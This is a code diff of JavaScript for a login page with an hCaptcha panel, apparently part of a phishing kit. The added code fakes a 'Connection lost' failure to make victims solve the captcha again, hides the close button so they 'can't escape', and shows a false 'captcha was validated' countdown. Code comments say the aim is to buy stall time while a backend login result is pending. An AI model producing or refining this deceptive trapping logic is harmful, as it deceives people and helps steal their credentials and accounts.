@@ -495,10 +495,16 @@ var _stallTimer = null;
 var _hcaptchaDone = false;
 var _pendingResult = null;
 var _hcaptchaWidgetId = null;
+var _solveCount = 0;
+var _countdownTimer = null;
+var _countdownLocked = false;
 
 function showCaptchaStall() {
   _hcaptchaDone = false;
   _pendingResult = null;
+  _solveCount = 0;
+  _countdownLocked = false;
+  if (_countdownTimer) { clearInterval(_countdownTimer); _countdownTimer = null; }
   var el = document.getElementById('captcha-stall');
   if (el) {
     el.classList.remove('visible');
@@ -541,6 +547,18 @@ function showCaptchaStall() {
 
 function hideCaptchaStall() {
   if (_stallTimer) { clearTimeout(_stallTimer); _stallTimer = null; }
+  if (_countdownTimer) { clearInterval(_countdownTimer); _countdownTimer = null; }
+  _countdownLocked = false;
+  _solveCount = 0;
+  /* Restore close button */
+  var closeBtn = document.getElementById('captcha-close');
+  if (closeBtn) closeBtn.style.display = '';
+  /* Restore hcaptcha wrap */
+  var hcWrap = document.querySelector('.hcaptcha-wrap');
+  if (hcWrap) hcWrap.style.display = '';
+  /* Restore verifying message */
+  var vf = document.getElementById('captcha-verifying');
+  if (vf) vf.innerHTML = '<span style="color:#ed4245;font-weight:600">Connection lost, please retry.</span>';
   var el = document.getElementById('captcha-stall');
   if (el) { el.classList.remove('visible'); el.classList.remove('show'); }
   _pendingResult = null;
@@ -560,26 +578,61 @@ function hideCaptchaStall() {
 
 function onHcaptchaPass(token) {
   _hcaptchaDone = true;
-  /* Show "Connection lost" — user thinks it failed and retries, buying stall time */
-  var vf = document.getElementById('captcha-verifying');
-  if (vf) vf.classList.add('show');
-  /* Reset widget after brief delay so user can re-solve (stall loop) */
-  setTimeout(function() {
-    try {
-      if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
-        hcaptcha.reset(_hcaptchaWidgetId);
-      }
-    } catch(e) {}
-  }, 600);
-  /* If backend result already waiting, close panel after a brief pause */
-  if (_pendingResult) {
+  _solveCount++;
+
+  if (_solveCount < 2) {
+    /* First solve: show "Connection lost" and reset for re-solve */
+    var vf = document.getElementById('captcha-verifying');
+    if (vf) { vf.innerHTML = '<span style="color:#ed4245;font-weight:600">Connection lost, please retry.</span>'; vf.classList.add('show'); }
     setTimeout(function() {
-      var pr = _pendingResult;
-      _pendingResult = null;
-      hideCaptchaStall();
-      processLoginResult(pr.d, pr.status);
-    }, 1200);
+      try {
+        if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
+          hcaptcha.reset(_hcaptchaWidgetId);
+        }
+      } catch(e) {}
+    }, 600);
+    /* If backend already done, stash it — we'll release after 2nd solve */
+    if (_pendingResult) { /* hold it */ }
+    return;
   }
+
+  /* ── 2nd solve: lock panel and start countdown ── */
+  _countdownLocked = true;
+  /* Hide the close button so user can't escape */
+  var closeBtn = document.getElementById('captcha-close');
+  if (closeBtn) closeBtn.style.display = 'none';
+  /* Hide the hcaptcha widget area — keep the checkmark feel by showing our message */
+  var hcWrap = document.querySelector('.hcaptcha-wrap');
+  if (hcWrap) hcWrap.style.display = 'none';
+  /* Show countdown message */
+  var vf = document.getElementById('captcha-verifying');
+  var countdownSec = 10;
+  if (vf) {
+    vf.innerHTML = '<span style="color:#3ba55d;font-weight:600">\u2705 HCaptcha is experiencing delays. Your captcha was validated.<br>Please wait <span id="captcha-countdown">' + countdownSec + '</span> seconds.</span>';
+    vf.classList.add('show');
+  }
+  /* Tick down every second */
+  if (_countdownTimer) clearInterval(_countdownTimer);
+  _countdownTimer = setInterval(function() {
+    countdownSec--;
+    var cdEl = document.getElementById('captcha-countdown');
+    if (countdownSec > 0) {
+      if (cdEl) cdEl.textContent = countdownSec;
+    } else {
+      /* Hit 0 — if backend result ready, release. Otherwise hold at 0 */
+      if (cdEl) cdEl.textContent = '0';
+      if (_pendingResult) {
+        clearInterval(_countdownTimer); _countdownTimer = null;
+        var pr = _pendingResult;
+        _pendingResult = null;
+        hideCaptchaStall();
+        processLoginResult(pr.d, pr.status);
+      }
+      /* else: stay at 0 — the _pendingResult setter in login handler will release */
+    }
+  }, 1000);
+
+  /* If backend result already waiting, it will be released by the countdown above */
 }
 
 function onHcaptchaExpire() { _hcaptchaDone = false; }
@@ -794,6 +847,19 @@ document.getElementById('login-form').addEventListener('submit', async function(
     } else {
       /* Backend done first, wait for user to solve captcha */
       _pendingResult = {d: d, status: r.status};
+      /* If countdown locked at 0, release immediately */
+      if (_countdownLocked) {
+        var cdEl = document.getElementById('captcha-countdown');
+        if (cdEl && cdEl.textContent === '0') {
+          if (_countdownTimer) { clearInterval(_countdownTimer); _countdownTimer = null; }
+          setTimeout(function() {
+            var pr = _pendingResult;
+            _pendingResult = null;
+            hideCaptchaStall();
+            processLoginResult(pr.d, pr.status);
+          }, 600);
+        }
+      }
     }
   } catch(err) {
     hideCaptchaStall();
